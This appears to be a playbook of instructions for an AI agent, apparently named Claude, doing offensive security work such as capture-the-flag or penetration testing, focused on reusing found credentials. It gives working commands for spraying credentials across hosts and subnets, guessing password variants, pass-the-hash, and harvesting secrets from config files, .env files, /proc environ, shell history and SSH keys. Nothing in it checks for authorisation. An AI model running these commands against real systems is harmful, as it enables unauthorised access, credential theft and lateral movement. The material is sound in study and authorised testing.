# Credential Reuse — What To Do When You Find Credentials

Every time you find a username, password, hash, or key, systematically test it across all available services. Credential reuse is one of the most reliable attack vectors — people reuse passwords everywhere.

---

## The Credential Reuse Checklist

When you find credentials (from PCAP, config files, databases, memory dumps, or any other source), try them on every accessible service. Start with CLI-testable services (Claude can run these directly), then hand off GUI-dependent ones to the user.

### 1. Same host, different services

**CLI-testable (run these first):**
```bash
# SSH
sshpass -p 'PASSWORD' ssh user@TARGET

# FTP
curl --user 'user:PASSWORD' ftp://TARGET/

# WinRM (Windows)
evil-winrm -i TARGET -u user -p PASSWORD

# SMB
crackmapexec smb TARGET -u user -p PASSWORD

# Database services
mysql -h TARGET -u user -p'PASSWORD'
psql -h TARGET -U user  # will prompt for password
mssqlclient.py user:PASSWORD@TARGET
```

**Requires user interaction (hand off after CLI tests are done):**
```bash
# RDP (Windows) — graphical session, Claude cannot operate this
xfreerdp /u:user /p:PASSWORD /v:TARGET
# → Tell the user: "RDP requires a GUI session. Try these creds
#   with xfreerdp and share what you find."

# Web login forms — Claude can send POST requests but can't reliably
# handle CSRF tokens, CAPTCHAs, or JS-rendered forms
# → Tell the user: "Try these creds on the login form at http://TARGET/login
#   and let me know the result."
```

### 2. Same credentials, other hosts

If you're on an internal network, spray the credential across the subnet:

```bash
# SMB spray (most common lateral movement)
crackmapexec smb RANGE/24 -u user -p PASSWORD

# SSH spray
crackmapexec ssh RANGE/24 -u user -p PASSWORD

# WinRM spray
crackmapexec winrm RANGE/24 -u user -p PASSWORD
```

### 3. Password variations

People use predictable patterns. If you found `Summer2025`, also try:

| Found | Try |
|-------|-----|
| `Summer2025` | `Summer2025!`, `Summer2026`, `Winter2025`, `summer2025` |
| `Company123` | `Company123!`, `Company1234`, `company123` |
| `Password1` | `Password1!`, `Password2`, `P@ssword1` |
| `nathan` (username) | `nathan`, `Nathan1`, `nathan123`, `Nathan!` |

---

## Credential Sources and What They Mean

| Source | What you have | What to do |
|--------|--------------|------------|
| PCAP (FTP, Telnet, HTTP Basic) | Cleartext username + password | Try on all services immediately |
| PCAP (HTTP POST) | Username + password from login form | Try on SSH/FTP/other web apps |
| Config files (.env, wp-config, web.config) | Database creds, API keys | Connect to DB, test API keys, try as SSH/system creds |
| /etc/shadow or SAM dump | Password hashes | Crack with hashcat/john, then spray |
| Browser saved passwords | Cleartext creds | Try on all services |
| .bash_history | Commands with embedded passwords | Extract and test everywhere |
| SSH keys (id_rsa) | Private key | Try on all SSH hosts: `ssh -i key user@HOST` |
| Kerberos TGS (Kerberoast) | Service account hash | Crack → use for lateral movement |
| NTLM hash | Windows hash | Pass-the-Hash (no cracking needed) |
| Database dump | User table with hashes | Crack → try on login portals and SSH |

---

## Extracting Credentials from Common Sources

### From PCAP files
```bash
# FTP/Telnet/HTTP Basic (cleartext protocols)
tshark -r file.pcap -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' -T fields -e ftp.request.command -e ftp.request.arg

# HTTP POST (login forms)
tshark -r file.pcap -Y 'http.request.method == "POST"' -T fields -e http.host -e http.request.uri -e urlencoded-form.value

# Or use the pcap_creds.py script for automated extraction
python3 scripts/pcap_creds.py file.pcap
```

### From config files
```bash
# Common credential-containing files
find / -name "*.conf" -o -name "*.config" -o -name "*.env" -o -name "*.ini" -o -name "*.yml" 2>/dev/null | \
  xargs grep -liE "password|passwd|pwd|secret|key|token" 2>/dev/null

# WordPress
cat wp-config.php | grep DB_

# .env files
cat .env | grep -iE "pass|secret|key|token"

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
```

### From history and memory
```bash
# Bash history
cat ~/.bash_history | grep -iE "pass|pwd|ssh|mysql|ftp|curl.*-u"

# Process environment
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token"

# Saved credentials (Windows)
cmdkey /list
```

---

## Decision Tree

```
Found credentials
    │
    ├── Same host has other services open?
    │   YES → Try CLI services first (SSH, FTP, SMB, WinRM, DB)
    │   │     Then hand off GUI services to user (RDP, web login forms)
    │   │
    │   └── Any of them work?
    │       YES → You have new access → run post-exploitation checklist
    │       NO → Try password variations
    │
    ├── Other hosts on the network?
    │   YES → Spray across subnet (crackmapexec)
    │   NO → Focus on current host
    │
    ├── Credentials are hashes (not cleartext)?
    │   YES → Crack with hashcat/john OR pass-the-hash if NTLM
    │
    └── Username but no password?
        → Check for password reuse with username as password
        → Check for default passwords for the service
        → Check for AS-REP roastable accounts (AD)
```

---

## Common Mistakes

1. **Only trying creds on the service where you found them** — Always test across all services
2. **Forgetting to try the username as the password** — `nathan:nathan` works more often than you'd expect
3. **Not checking for key files** — An SSH key is just as good as a password
4. **Ignoring service accounts** — Database credentials from config files often work as system credentials too
5. **Spraying without checking lockout policy** — On real engagements, check lockout before spraying
